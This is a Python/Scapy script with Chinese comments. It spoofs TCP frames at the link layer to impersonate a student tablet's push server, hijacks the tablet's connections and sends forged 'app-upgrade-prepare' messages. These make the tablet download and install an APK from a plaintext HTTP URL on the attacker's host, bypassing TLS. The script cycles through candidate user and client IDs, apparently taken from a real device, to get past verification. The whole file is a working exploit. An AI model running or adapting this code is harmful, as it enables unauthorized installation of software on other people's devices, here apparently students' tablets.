# -*- coding: utf-8 -*-
"""npcap_pbs.py -- 真机 PBS(链路层冒充)完整应答器: 学习 clientId/appId 并下发 app-upgrade-prepare

原理(已实机验证于 npcap3200.py):
  本机栈会丢弃"伪造源"的帧, 但 Npcap(NDIS) 链路层发送可穿透 -> 平板正常回 ACK。
  真 PBS(121.41.123.196:8106) 在本网络不可达(抓包 7 次 SYN 全无 SYNACK),
  故我们的 SYNACK 无竞争地胜出。

协议(逆向自 PushTcp.java:72-101, 与 push_pbs.py 一致):
  16 字节小端头: MAGIC(2103345) + length(=payload+16) + version(1) + flag(0), 之后 UTF-8 JSON
  平板 -> 服务器: {"command":"SEND_CLIENT_ID","body":{"clientId":..,"appId":..}}
                   {"command":"HB"}
  服务器 -> 平板: PushMessage JSON(appId 必须 == subAppId 且 == 平板 matePushAppId)

交付链路:
  app-upgrade-prepare 的 payload 里 url 完全由推送方指定 ->
  LauncherPushService.disposeMessage -> HomeActivity.dealPushMsgEvent ->
  PrepareAppUpgradeNotification.transformAppUpdateTask -> AppUpdateManager.preDownloadApp(url)
  => 平板从我们指定的明文 HTTP 地址下载 APK, 绕开 TLS 与 HTTPS 任务面。

userId 门禁:
  PBS 层 PushConfig.matchUser 宽松(userId<=0 即过);
  launcher 层要求 pushMessage.userId == SessionData.getUserId()。
  故对候选 uid 逐个下发(设备会丢弃不匹配者), 候选来自 3200 注册帧与历史观测。

用法: python npcap_pbs.py [watch_seconds]
"""
import hashlib
import json
import os
import random
import re
import struct
import subprocess
import sys
import threading
import time
import datetime

import warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, IP, TCP, Raw, conf, AsyncSniffer
from scapy.arch.windows import get_windows_if_list

MAGIC = 2103345
PAD_MAC = "80:20:fd:8b:4b:fa"
ICS_MAC = "52:bb:b5:4f:7f:3e"
IFINDEX = 12
PORT = 8106
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 3600
BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "npcap_pbs.log")

APK_PATH = os.path.join(BASE, "agent.apk")
APK_URL = os.environ.get("PBS_APK_URL") or "http://192.168.137.1:8090/agent.apk"
PKG = "com.olive.agent"
# BaseApplication.getMatePushAppId() 硬编码值: 学生端 zty_stu, 教师端 zty_tea。
# 平板是学生端 => zty_stu。LauncherPushService 门禁要求 appId == getMatePushAppId()。
DEFAULT_APPID = os.environ.get("PBS_APPID") or "zty_stu"
# 候选 userId。**首位 316724 已从代码确认**: ControlManager 把
# (SessionData.getSchoolId(), SessionData.getUserId()) 交给 3200 控制通道, 而注册帧里
# 两个数字是 2112229(schoolId) 与 "2112229,316724" -> userId = 316724。
# 其余为兜底。端侧探测连接 EST 后约 5ms 即 FIN, 故首位那一帧最可能落地。
CAND_UIDS = [x for x in (os.environ.get("PBS_UIDS") or "316724,2112229,10001,0").split(",") if x]

# clientId 候选。onReceiver 的**第一道门禁**就是 verifyClientId:
#   XHStringUtil.equals(pushMessage.clientId, this.clientId) 不匹配 → 静默 return,
#   不回执、不处理 —— 这正是我们观察到"零回包"的最可能原因。
# deviceId(32hex) 与 SN 均来自 3200 注册帧实测值; 末尾空串是"双方皆 null"的兜底。
CAND_CIDS = [x for x in (os.environ.get("PBS_CIDS") or
             "3f025ad519274a6795aaf5161efd7726,R52N9067SSF,").split(",")]
# uid 优先: 先试已确认的 316724 配全部 clientId 候选, 再退到其它 uid。
_PUSH_ORDER = [(u, c) for u in CAND_UIDS for c in CAND_CIDS]

_sock = None
_lock = threading.Lock()
flows = {}
stat = {"syn": 0, "est": 0, "rx_frames": 0, "tx_frames": 0, "dup": 0,
        "learned": "", "pushed": 0, "feedback": []}


def _detect_pad(mac=PAD_MAC):
    want = mac.replace(":", "-").lower()
    try:
        out = subprocess.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return "192.168.137.73"


PAD = _detect_pad()
_pad_ttl = {"t": 0.0}


def pad_now():
    global PAD
    if time.time() - _pad_ttl["t"] > 20:
        _pad_ttl["t"] = time.time()
        new = _detect_pad()
        if new != PAD:
            wlog("PAD 漂移: %s -> %s" % (PAD, new))
            PAD = new
    return PAD


def wlog(s):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], s)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def iface_name():
    for d in get_windows_if_list():
        if d.get("index") == IFINDEX:
            return r"\Device\NPF_" + d["guid"]


def apk_md5():
    try:
        with open(APK_PATH, "rb") as f:
            return hashlib.md5(f.read()).hexdigest()
    except OSError:
        return ""


def send(frame):
    global _sock
    with _lock:
        if _sock is None:
            _sock = conf.L2socket(iface=iface_name())
        _sock.send(frame)


def emit(dst_ip, sport, dport, flags, seq, ack, payload=b""):
    pad = pad_now()
    pkt = (Ether(dst=PAD_MAC, src=ICS_MAC) /
           IP(src=dst_ip, dst=pad, ttl=64) /
           TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack, window=64240))
    if payload:
        pkt = pkt / Raw(payload)
    send(pkt)
    stat["tx_frames"] += 1


def frame(payload_bytes):
    return struct.pack("<iiii", MAGIC, len(payload_bytes) + 16, 1, 0) + payload_bytes


def build_push(client_id, app_id, uid):
    # appId 硬编码自 BaseApplication.getMatePushAppId(): 学生端 zty_stu / 教师端 zty_tea。
    # LauncherPushService 门禁要求 appId == getMatePushAppId() 且 subAppId == appId。
    aid = app_id or DEFAULT_APPID
    inner = json.dumps({
        "appId": aid,
        "md5": apk_md5(),
        "packageName": PKG,
        "taskId": "olive_%d" % int(time.time()),
        "url": APK_URL,
        "userId": int(uid) if uid.isdigit() else 0,
        "versionCode": 1,
    })
    msg = {
        "msgId": "olive-%d-%s" % (int(time.time() * 1000), uid),
        "userId": uid,
        "appId": aid,
        "subAppId": aid,          # 必须 == appId, 否则被 transMessage 转走, 不进 disposeMessage
        "msgType": "app-upgrade-prepare",
        "subMsgType": "app-upgrade-prepare",
        "payload": inner,
        "style": 0,
    }
    # clientId 留空: 端侧 this.clientId 尚未赋值(它从不发 SEND_CLIENT_ID), 双方皆 null
    # => verifyClientId 的 equals 成立。
    if client_id:
        msg["clientId"] = client_id
    return frame(json.dumps(msg).encode("utf-8"))


_PUSH_CACHE = {}


def push_bytes(uid, client_id=""):
    """预构建缓存: 端侧"连上即 FIN"只有约 5ms 窗口, 不能在做包上浪费任何时间。"""
    key = (uid, client_id)
    if key not in _PUSH_CACHE:
        _PUSH_CACHE[key] = build_push(client_id, "", uid)
    return _PUSH_CACHE[key]


def push_now(f, server, dport, sport, client_id=""):
    """握手一完成立刻连发全部 (userId, clientId) 组合 —— 无 sleep, 抢在端侧 FIN 之前。
    实测端侧这些连接是"可达性探测"(EST 后约 15ms 即 FIN), 慢一帧就白费。
    client_id 参数非空时只发该值(来自 SEND_CLIENT_ID), 否则遍历 CAND_CIDS。"""
    t0 = time.time()
    combos = [(u, client_id) for u in CAND_UIDS] if client_id else _PUSH_ORDER
    for uid, cid in combos:
        data = push_bytes(uid, cid)
        emit(server, dport, sport, "PA", f["mine"], f["next"], data)
        f["mine"] = (f["mine"] + len(data)) & 0xFFFFFFFF
        stat["pushed"] += 1
    wlog("[PUSH] 连发 %d 帧 appId=%s (uid,cid)顺序=%s url=%s 耗时 %.1fms" % (
        len(combos), DEFAULT_APPID,
        [(u, c if c else "<empty>") for u, c in combos[:4]], APK_URL, (time.time() - t0) * 1000))


def handle_frame(f, body, server, sport):
    try:
        text = body.decode("utf-8", "replace")
    except Exception:
        text = ""
    wlog("FRAME <- pad len=%d  %s" % (len(body), text[:400]))
    try:
        obj = json.loads(text)
    except Exception:
        return
    cmd = obj.get("command")
    if cmd == "SEND_CLIENT_ID":
        b = obj.get("body") or {}
        cid = b.get("clientId") or ""
        aid = b.get("appId") or ""
        stat["learned"] = "clientId=%s appId=%s" % (cid, aid)
        wlog("[LEARNED] clientId=%s appId=%s" % (cid, aid))
        if not cid or not aid:
            return
        # 对候选 userId 逐个下发(设备丢弃不匹配者)
        for uid in CAND_UIDS:
            data = build_push(cid, aid, uid)
            emit(server, f.get("dport", PORT), sport, "PA", f["mine"], f["next"], data)
            f["mine"] = (f["mine"] + len(data)) & 0xFFFFFFFF
            stat["pushed"] += 1
            wlog("[PUSH] subMsgType=app-upgrade-prepare uid=%s url=%s (%dB)" % (uid, APK_URL, len(data)))
            time.sleep(0.05)
    elif cmd in ("FEEDBACK_PUSH_MSG", "HB", "REPLAY"):
        stat["feedback"].append(text[:200])
        wlog("[%s] %s" % (cmd, text[:200]))


def try_frames(f, server, sport):
    buf = f["buf"]
    while len(buf) >= 16:
        try:
            magic, ln, ver, flag = struct.unpack("<iiii", buf[:16])
        except Exception:
            f["buf"] = b""
            return
        if magic != MAGIC or ln < 16 or ln > 262144:
            wlog("BADFRAME magic=%s len=%s (丢弃缓冲 %dB)" % (hex(magic & 0xFFFFFFFF), ln, len(buf)))
            f["buf"] = b""
            return
        if len(buf) < ln:
            return
        body = buf[16:ln]
        f["buf"] = buf[ln:]
        handle_frame(f, body, server, sport)


def on_pkt(p):
    try:
        if not (p.haslayer(TCP) and p.haslayer(IP)):
            return
        ip, t = p[IP], p[TCP]
        pad = pad_now()
        # 端口无关: PBS 地址由服务端下发(可能不是 8106), 故不能写死端口。
        # 只排除 443(tls_relay)/80(npcap_http80)/53 以免抢别人负责的流量。
        # 端口无关接管 PBS 候选, 但必须放掉已被实测确认"不是 PBS"的端口:
        #   443 tls_relay / 80 npcap_http80 / 53 DNS / 3200 npcap3200 各有专责
        #   8089 = 端侧数据上报明文 HTTP(载荷 "POST", 体内 H4sI=gzip+base64)
        #   8106 = 另一应用 com.xh.arespunc 的配置口
        #          (实测载荷: GET /config/Android.conf?project=default&app_id=com.xh.arespunc)
        #   去抢这两个只会打断端侧正常功能, 零收益。
        if ip.src != pad or t.dport in (443, 80, 53, 3200, 8089, 8106):
            return
        server, dport = ip.dst, t.dport
        key = (server, dport, t.sport)
        f = flows.get(key)
        pl = bytes(t.payload) if t.payload else b""

        if t.flags & 0x02 and not t.flags & 0x10:  # SYN
            isn = random.randint(0x40000000, 0x7FFFFFFF)
            flows[key] = {"next": (t.seq + 1) & 0xFFFFFFFF, "mine": (isn + 1) & 0xFFFFFFFF,
                          "est": False, "buf": b"", "dport": dport}
            stat["syn"] += 1
            stat.setdefault("ports", {})
            stat["ports"][dport] = stat["ports"].get(dport, 0) + 1
            emit(server, dport, t.sport, "SA", isn, (t.seq + 1) & 0xFFFFFFFF)
            wlog("SYN %s:%d <- %s:%d -> 冒充 SYNACK isn=%08x (第%d次)" % (
                server, dport, pad, t.sport, isn, stat["syn"]))
            return

        if f is None:
            return

        if t.flags & 0x04:
            wlog("RST from pad %s:%d (flow drop)" % (pad, t.sport))
            flows.pop(key, None)
            return

        if not f["est"] and t.flags & 0x10:
            f["est"] = True
            stat["est"] += 1
            wlog("ESTABLISHED %s:%d <-> %s:%d" % (server, dport, pad, t.sport))
            # 端侧只做"连上即 FIN"的可达性探测, 从不送 SEND_CLIENT_ID -> 不等它, 立即推送
            try:
                push_now(f, server, dport, t.sport)
            except Exception as e:
                wlog("PUSH-ERR %s %s" % (type(e).__name__, e))

        if pl:
            seq = t.seq
            if ((seq - f["next"]) & 0xFFFFFFFF) > 0x30000000:
                stat["dup"] += 1
                emit(server, dport, t.sport, "A", f["mine"], f["next"])
            else:
                f["next"] = (seq + len(pl)) & 0xFFFFFFFF
                stat["rx_frames"] += 1
                f["buf"] += pl
                emit(server, dport, t.sport, "A", f["mine"], f["next"])
                wlog("RX %s:%d len=%d head=%s" % (server, dport, len(pl), pl[:64].hex()))
                try_frames(f, server, t.sport)
        elif t.flags & 0x01:
            emit(server, dport, t.sport, "FA", f["mine"], (t.seq + 1) & 0xFFFFFFFF)
            wlog("FIN from pad -> FINACK, 关流")
            flows.pop(key, None)
        else:
            emit(server, dport, t.sport, "A", f["mine"], f["next"])
    except Exception as e:
        wlog("ERR %s %s" % (type(e).__name__, e))


def main():
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("\n===== npcap_pbs start %s watch=%ds apk_md5=%s =====\n" % (
            datetime.datetime.now(), WATCH, apk_md5()))
    wlog("iface=%s pad=%s 端口无关接管(除443/80/53/3200/8089/8106) | APK=%s | appId=%s | uids=%s" % (
        iface_name(), PAD, APK_URL, DEFAULT_APPID, CAND_UIDS))
    # 预热推送缓存: 把做包开销移出"EST 后约 15ms"的热路径
    for _u, _c in _PUSH_ORDER:
        try:
            push_bytes(_u, _c)
        except Exception:
            pass
    wlog("推送缓存预热完成 %d 组: %s" % (len(_PUSH_CACHE), sorted(len(v) for v in _PUSH_CACHE.values())))
    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt,
                      filter="tcp and not port 443 and not port 80 and not port 53")
    sn.start()
    t0 = time.time()
    while time.time() - t0 < WATCH:
        time.sleep(5)
        wlog("[stat] %s" % stat)
    sn.stop()
    wlog("[end] %s" % stat)


if __name__ == "__main__":
    main()
